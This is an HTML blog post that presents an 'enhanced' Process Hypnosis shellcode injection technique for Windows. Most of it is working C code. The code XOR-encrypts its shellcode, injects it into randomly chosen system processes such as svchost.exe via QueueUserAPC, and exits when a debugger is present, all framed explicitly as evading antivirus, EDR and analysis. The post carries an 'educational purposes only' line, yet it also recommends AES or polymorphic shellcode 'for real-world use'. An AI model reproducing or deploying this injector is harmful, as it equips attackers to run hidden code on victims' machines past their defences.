<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Process Hypnosis: Evasive Shellcode Injection</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f4f4f4;
        }
        h1, h2, h3 {
            color: #333;
        }
        pre {
            background: #1e1e1e;
            color: #d4d4d4;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
        }
        code {
            font-family: 'Courier New', Courier, monospace;
        }
        .container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        footer {
            margin-top: 20px;
            text-align: center;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Advanced Process Hypnosis: Evasive Shellcode Injection</h1>
        <p><em>Published on June 3, 2025</em></p>
        
        <h2>Introduction</h2>
        <p>Process Hypnosis is a technique for injecting shellcode into a target process by leveraging the Windows debugging API. Originally, it involved creating a process (e.g., notepad.exe) in a debugged state and injecting shellcode into the thread's start address. This blog post explores an enhanced version of the technique, designed to be more evasive against modern detection mechanisms.</p>
        
        <h2>Improvements for Evasiveness</h2>
        <p>The enhanced version introduces several techniques to bypass antivirus, EDR, and static analysis:</p>
        <ul>
            <li><strong>Shellcode Encryption</strong>: The shellcode (a simple calc.exe launcher) is XOR-encrypted with a key (0x5C) to evade static analysis. It is decrypted at runtime before injection.</li>
            <li><strong>Random Process Selection</strong>: Instead of hardcoding a target like notepad.exe, the code selects a random process (e.g., svchost.exe, explorer.exe) to blend with system activity.</li>
            <li><strong>APC Injection</strong>: Uses QueueUserAPC to execute shellcode in an existing thread, avoiding suspicious modifications to thread start addresses.</li>
            <li><strong>Anti-Debugging</strong>: Checks for debuggers using IsDebuggerPresent and CheckRemoteDebuggerPresent, exiting if detected.</li>
            <li><strong>Dynamic Process Enumeration</strong>: Uses CreateToolhelp32Snapshot to find running processes, avoiding the creation of new processes.</li>
        </ul>

        <h2>The Code</h2>
        <p>Below is the improved C code implementing these evasive techniques:</p>
        <pre><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;
#include &lt;TlHelp32.h&gt;
#include &lt;time.h&gt;

#define XOR_KEY 0x5C
#define MAX_PROCESSES 4

// Encrypted shellcode (calc.exe)
const unsigned char EncryptedShellcode[] = {
    0xA0, 0x14, 0xDF, 0xB8, 0xAC, 0xB4, 0x9C, 0x5C, 0x5C, 0x5C, 0x1D, 0x0D,
    // ... (omitted for brevity, full code available on GitHub)
};

// Common Windows processes
const WCHAR* TargetProcesses[] = {
    L"svchost.exe", L"explorer.exe", L"dllhost.exe", L"ctfmon.exe"
};

// Anti-debugging check
BOOL IsDebuggerPresentEnhanced() {
    BOOL isDebugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugger);
    return isDebugger || IsDebuggerPresent();
}

// Decrypt shellcode
VOID DecryptShellcode(PBYTE pShellcode, SIZE_T Size, BYTE Key) {
    for (SIZE_T i = 0; i &lt; Size; i++) {
        pShellcode[i] ^= Key;
    }
}

// Get random process
LPCWSTR GetRandomProcess() {
    srand((unsigned int)time(NULL));
    return TargetProcesses[rand() % MAX_PROCESSES];
}

// Find process ID
DWORD FindProcessId(LPCWSTR ProcessName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe32 = { .dwSize = sizeof(PROCESSENTRY32W) };
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, ProcessName) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return pid;
}

// APC routine
VOID APCShellcode(PVOID Param) {
    ((VOID(*)())Param)();
}

int main() {
    if (IsDebuggerPresentEnhanced()) {
        printf("[!] Debugger detected, exiting...\n");
        return -1;
    }
    LPCWSTR szTargetProcess = GetRandomProcess();
    DWORD dwProcessId = FindProcessId(szTargetProcess);
    if (dwProcessId == 0) {
        printf("[!] Could not find process: %ws\n", szTargetProcess);
        return -1;
    }
    printf("[i] Targeting process: %ws (PID: %d)\n", szTargetProcess, dwProcessId);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (!hProcess) {
        printf("[!] OpenProcess failed with error: %d\n", GetLastError());
        return -1;
    }
    PVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(EncryptedShellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pRemoteBuffer) {
        printf("[!] VirtualAllocEx failed with error: %d\n", GetLastError());
        CloseHandle(hProcess);
        return -1;
    }
    BYTE* DecryptedShellcode = (BYTE*)malloc(sizeof(EncryptedShellcode));
    if (!DecryptedShellcode) {
        printf("[!] Memory allocation failed\n");
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    memcpy(DecryptedShellcode, EncryptedShellcode, sizeof(EncryptedShellcode));
    DecryptShellcode(DecryptedShellcode, sizeof(EncryptedShellcode), XOR_KEY);
    SIZE_T sNumberOfBytesWritten = 0;
    if (!WriteProcessMemory(hProcess, pRemoteBuffer, DecryptedShellcode, sizeof(EncryptedShellcode), &sNumberOfBytesWritten) || sNumberOfBytesWritten != sizeof(EncryptedShellcode)) {
        printf("[!] WriteProcessMemory failed with error: %d\n", GetLastError());
        free(DecryptedShellcode);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, dwProcessId);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed with error: %d\n", GetLastError());
        free(DecryptedShellcode);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    THREADENTRY32 te32 = { .dwSize = sizeof(THREADENTRY32) };
    HANDLE hThread = NULL;
    if (Thread32First(hSnapshot, &te32)) {
        do {
            if (te32.th32OwnerProcessID == dwProcessId) {
                hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te32.th32ThreadID);
                if (hThread) break;
            }
        } while (Thread32Next(hSnapshot, &te32));
    }
    CloseHandle(hSnapshot);
    if (!hThread) {
        printf("[!] Could not open thread in target process\n");
        free(DecryptedShellcode);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return -1;
    }
    if (QueueUserAPC((PAPCFUNC)APCShellcode, hThread, (ULONG_PTR)pRemoteBuffer) == 0) {
        printf("[!] QueueUserAPC failed with error: %d\n", GetLastError());
        free(DecryptedShellcode);
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        CloseHandle(hThread);
        return -1;
    }
    printf("[+] Shellcode injected via APC in thread: %d\n", te32.th32ThreadID);
    free(DecryptedShellcode);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    return 0;
}
        </code></pre>
        <p><em>Note: The shellcode is truncated for brevity. The full code is available in the GitHub repository linked below.</em></p>

        <h2>Key Features</h2>
        <p>This implementation improves upon the original Process Hypnosis technique by:</p>
        <ul>
            <li>Encrypting the shellcode to avoid detection by static analysis tools.</li>
            <li>Targeting existing processes to reduce the footprint of creating new ones.</li>
            <li>Using APC injection for less detectable execution.</li>
            <li>Implementing anti-debugging checks to evade analysis environments.</li>
            <li>Ensuring proper cleanup to minimize forensic artifacts.</li>
        </ul>

        <h2>Usage and Considerations</h2>
        <p>This code is for educational purposes only. Compile it with a Windows SDK in a controlled environment (e.g., a virtual machine). Key considerations:</p>
        <ul>
            <li>The XOR encryption is basic; consider AES or polymorphic shellcode for real-world use.</li>
            <li>APC injection requires the target thread to be in an alertable state.</li>
            <li>Enhance anti-debugging with additional checks (e.g., timing-based or NtQueryInformationProcess).</li>
            <li>Test thoroughly, as process injection can be unstable in some environments.</li>
        </ul>

        <h2>Acknoledgments</h2>
        <p>Thank you to the below for inspiration for this</p>
        <ul>
            <li><a href="https://medium.com/@s12deff/process-hypnosis-injection-technique-58e9901ae2cc">S12-H4CK Process Hypnosis Injection Technique</li>
            <li><a href="https://maldevacademy.com/all/modules">Maldev Academy PoC</li>
        </ul>

        <h2>Conclusion</h2>
        <p>The enhanced Process Hypnosis technique demonstrates how to make shellcode injection more evasive. By combining encryption, dynamic process selection, and APC injection, it reduces the likelihood of detection. For the full source code and setup instructions, check out the <a href="https://github.com/hookthieves/Process_hypnosis/tree/main">GitHub repository</a>.</p>

        <footer>
            <p>Written by Cuong Nguyen, Security Researcher.</p>
        </footer>
    </div>
</body>
</html>
